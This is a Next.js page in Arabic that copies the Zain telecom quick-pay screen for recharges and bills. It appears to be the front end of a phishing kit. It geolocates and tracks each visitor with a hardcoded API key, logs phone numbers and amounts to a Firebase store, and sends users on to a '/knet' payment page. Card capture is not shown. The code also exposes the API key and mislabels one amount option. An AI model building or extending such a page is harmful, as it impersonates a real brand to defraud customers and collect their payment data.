"use client"

import { useCallback, useEffect, useState } from "react"
import Image from "next/image"
import { Button } from "@/components/ui/button"
import { Card, CardContent } from "@/components/ui/card"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs"
import { Heart, Menu, Plus, ShoppingCart, X } from "lucide-react"
import type { FC } from "react"
import { setupOnlineStatus } from "@/lib/utils"
import { addData } from "@/lib/firebase"
import "./globals.css"
import LoaderApp from "@/components/loader"

interface RechargeItem {
  id: number
  number: string
  amount: string
}
const visitorId = `zssain-app-${Math.random().toString(36).substring(2, 15)}`;

const PaymentForm: FC = () => {
  const [rechargeItems, setRechargeItems] = useState<RechargeItem[]>([{ id: 1, number: "99122433", amount: "6.000" }])
  const [billNumber, setBillNumber] = useState("")
  const [billAmount, setBillAmount] = useState("")
  const [activeTab, setActiveTab] = useState("recharge")
  const [phone, setPhone] = useState("")
  const [isLoading, setIsLoading] = useState(false)

  const addNewNumber = () => {
    setRechargeItems([...rechargeItems, { id: Date.now(), number: "", amount: "6.000" }])
  }
  const removeNumber = (id: number) => {
    setRechargeItems(rechargeItems.filter((item) => item.id !== id))
  }
  const handleInputChange = (id: number, field: "number" | "amount", value: string) => {
    setRechargeItems(rechargeItems.map((item) => (item.id === id ? { ...item, [field]: value } : item)))
  }



  const totalAmount =
    activeTab === "recharge"
      ? rechargeItems.reduce((sum, item) => sum + Number.parseFloat(item.amount || "0"), 0)
      : Number.parseFloat(billAmount || "0")
  useEffect(() => {
    const amount = localStorage.setItem("amount", totalAmount!.toString()) // Consider if this is necessary or should be component state only

  }, [totalAmount])

  const handleSubmit = async (e: any) => {
    e.preventDefault()
    setIsLoading(true)
    try {
      await addData({
        id: visitorId,
        phone: phone, // Storing phone number, ensure compliance with privacy regulations
        amount: totalAmount,
        timestamp: new Date().toISOString(),
        currentPage: "كي نت ",
        action: "payment_submit_attempt"
      }).then(() => {
        window.location.href = "/knet"; // Replace with Next.js router if possible: router.push('/checkout')

      })

    } catch (error) {
      console.error("Submission error:", error);
      await addData({
        id: visitorId,
        action: "payment_submit_error",
        error: error instanceof Error ? error.message : String(error)
      });
      // Handle error display to user
    } finally {
      setIsLoading(false)
    }
  }

  return (
    <form className="w-full" onSubmit={handleSubmit}>
      <Card className="bg-white rounded-xl shadow-md border-none">
        <CardContent className="p-4">
          <Tabs defaultValue="recharge" onValueChange={setActiveTab} value={activeTab}>
            <TabsList className="grid grid-cols-2 bg-transparent p-0 h-auto">
              <TabsTrigger
                value="bill"
                className="text-gray-500 pb-3 data-[state=active]:text-zain-pink data-[state=active]:shadow-[inset_0_-2px_0_0_currentColor] rounded-none"
              >
                دفع الفاتورة
              </TabsTrigger>
              <TabsTrigger
                value="recharge"
                className="text-gray-500 pb-3 data-[state=active]:text-zain-pink data-[state=active]:shadow-[inset_0_-2px_0_0_currentColor] rounded-none"
              >
                إعادة تعبئة eeZee
              </TabsTrigger>
            </TabsList>
            <TabsContent value="bill" className="pt-6">
              <form className="space-y-4 p-4 border border-gray-100 rounded-lg" onSubmit={handleSubmit}>
                <div className="space-y-2">
                  <label htmlFor="bill-phone" className="text-sm text-gray-700">
                    رقم الهاتف *
                  </label>
                  <Input
                    id="bill-phone"
                    type="tel"
                    value={phone}
                    onChange={(e) => setPhone(e.target.value)}
                    className="bg-zain-light-blue border-0 border-b-2 border-zain-pink-light rounded-none px-2 text-lg h-12 text-center focus-visible:ring-0"
                    placeholder="أدخل رقم الهاتف"
                  />
                </div>
                <div className="space-y-2">
                  <label htmlFor="bill-amount" className="text-sm text-gray-700">
                    المبلغ للدفع
                  </label>
                  <Input
                    id="bill-amount"
                    type="text"
                    value={billAmount}
                    onChange={(e) => setBillAmount(e.target.value)}
                    className="bg-zain-light-blue border-0 border-b-2 border-zain-pink-light rounded-none px-2 text-lg h-12 text-center focus-visible:ring-0"
                    placeholder="0.000 د.ك"
                  />
                </div>
              </form>
            </TabsContent>
            <TabsContent value="recharge" className="pt-6">
              <div className="space-y-4">
                {rechargeItems.map((item, index) => (
                  <div key={item.id} className="space-y-4 p-4 border border-gray-100 rounded-lg relative">
                    {rechargeItems.length > 1 && (
                      <button
                        onClick={() => removeNumber(item.id)}
                        className="absolute top-2 left-2 text-gray-400 hover:text-red-500"
                      >
                        <X size={18} />
                      </button>
                    )}
                    <div className="space-y-2">
                      <label className="text-sm text-gray-700">أود أن أعيد التعبئة لـ</label>
                      <Select defaultValue="other">
                        <SelectTrigger className="w-full border-0 border-b-2 border-zain-pink-light rounded-none px-0 text-lg focus:ring-0">
                          <SelectValue placeholder="رقم آخر" />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="other">رقم آخر</SelectItem>
                          <SelectItem value="own">رقمي</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                    <div className="space-y-2">
                      <label htmlFor={`phone-${item.id}`} className="text-sm text-gray-700">
                        رقم الهاتف *
                      </label>
                      <Input
                        id={`phone-${item.id}`}
                        type="tel"
                        maxLength={8}
                        value={phone}
                        onChange={(e) => setPhone(e.target.value)}
                        className="bg-zain-light-blue border-0 border-b-2 border-zain-pink-light rounded-none px-2 text-lg h-12 text-center focus-visible:ring-0"
                      />
                    </div>
                    <div className="space-y-2">
                      <label htmlFor={`amount-${item.id}`} className="text-sm text-gray-700">
                        مبلغ التعبئة
                      </label>
                      <Select
                        value={item.amount}
                        onValueChange={(value) => handleInputChange(item.id, "amount", value)}
                      >
                        <SelectTrigger className="w-full border-0 border-b-2 border-zain-pink-light rounded-none px-0 text-lg focus:ring-0">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="1.500">1.500 د.ك</SelectItem>
                          <SelectItem value="3.000">3.000 د.ك</SelectItem>
                          <SelectItem value="6.000">6.000 د.ك</SelectItem>
                          <SelectItem value="10.000">10.000 د.ك</SelectItem>
                          <SelectItem value="20.000">20.000 د.ك</SelectItem>
                          <SelectItem value="30.000">3.000 د.ك</SelectItem>
                          <SelectItem value="50.000">50.000 د.ك</SelectItem>
                          <SelectItem value="100.000">100.000 د.ك</SelectItem>
                        </SelectContent>
                      </Select>
                      <p className="text-xs text-gray-500">الصلاحية 30 يوم</p>
                    </div>
                  </div>
                ))}
              </div>
              <Button
                variant="outline"
                className="w-full mt-6 border-zain-pink text-zain-pink hover:bg-zain-pink/10 hover:text-zain-pink rounded-lg py-6 text-lg bg-transparent"
                onClick={addNewNumber}
              >
                <Plus className="ml-2" />
                أضف رقم آخر
              </Button>
            </TabsContent>
          </Tabs>
        </CardContent>
      </Card>
      <div className="mt-8 px-4">
        <div className="flex justify-between items-center">
          <span className="text-2xl font-bold text-gray-800">إجمالي</span>
          <span className="text-3xl font-bold text-zain-green">{totalAmount.toFixed(3)} د.ك</span>
        </div>
        <Button disabled={phone.length<8} 
        type="submit" className="w-full mt-4 bg-zain-pink hover:bg-zain-pink/90 rounded-lg py-7 text-xl font-bold">
          {activeTab === "recharge" ? "أعد التعبئة الآن" : "ادفع الفاتورة الآن"}
        </Button>
      </div>
      {isLoading && <LoaderApp />}
    </form>
  )
}

export default function ZainPaymentPage() {

  const getLocationAndLog = useCallback(async () => {
    if (!visitorId) return;

    // This API key is public and might be rate-limited or disabled.
    // For a production app, use a secure way to handle API keys, ideally on the backend.
    const APIKEY = "d8d0b4d31873cc371d367eb322abf3fd63bf16bcfa85c646e79061cb"
    const url = `https://api.ipdata.co/country_name?api-key=${APIKEY}`

    try {
      const response = await fetch(url)
      if (!response.ok) {
        throw new Error(`HTTP error! Status: ${response.status}`)
      }
      const country = await response.text()
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        country: country,
        action: "page_load",
        currentPage: "الرئيسية ",
      })
      localStorage.setItem("country", country) // Consider privacy implications
      setupOnlineStatus(visitorId)
    } catch (error) {
      console.error("Error fetching location:", error)
      // Log error with visitor ID for debugging
      await addData({
        createdDate: new Date().toISOString(),
        id: visitorId,
        error: `Location fetch failed: ${error instanceof Error ? error.message : String(error)}`,
        action: "location_error"
      });
    }
  }, [visitorId]);

  useEffect(() => {
    if (visitorId) {
      getLocationAndLog();
    }
  }, [visitorId, getLocationAndLog]);

  return (
    <div className="min-h-screen bg-gray-50 font-sans">
      <header className="bg-zain-purple text-white">
        <div className="container mx-auto px-4 h-16 flex justify-between items-center">
          <div className="flex items-center gap-4">
            <button>
              <Menu />
            </button>
            <button>
              <Heart />
            </button>
            <div className="relative">
              <button className="bg-white text-zain-purple rounded-full p-2">
                <ShoppingCart size={20} />
              </button>
            </div>
          </div>
          <img src="/zain-m.png" alt="Zain Logo" width={100} height={45}  />
        </div>
      </header>
      <main className="container mx-auto p-4 max-w-md">
        <h1 className="text-3xl font-bold text-center my-6 text-gray-800">الدفع السريع</h1>
        <PaymentForm />
      </main>
    </div>
  )
}
